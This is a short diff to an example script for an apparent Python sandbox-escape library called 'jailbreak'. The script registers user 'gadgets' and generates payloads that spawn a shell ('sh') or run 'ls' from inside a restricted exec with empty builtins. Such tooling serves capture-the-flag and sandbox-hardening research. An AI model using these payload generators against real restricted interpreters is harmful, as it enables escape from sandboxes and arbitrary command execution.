@@ -33,9 +33,20 @@ def sys__user(*, str):
 #reset config so jail has nothing provided and no restrictions
 jailbreak.config()
 #provide sys gadget
-jailbreak.register_user_gadget(sys__user)
+jailbreak.register_user_gadget(sys__user, 'python')
 
 payload = jailbreak.get_shell("'sh'")
 print(payload)
-# import sys
-# exec(payload, {'__builtins__': {}, 'sys': sys})
+# exec(payload, {'__builtins__': {}})
+
+print("\n---------\n")
+
+#example user gadget as last in chain
+def ls__user(*, get_shell):
+    return get_shell('ls')
+
+jailbreak.config()
+jailbreak.register_user_gadget(ls__user, 'python')
+
+payload = jailbreak.ls()  #ls does not exist in repo gadgets, but is provided by user
+print(payload)
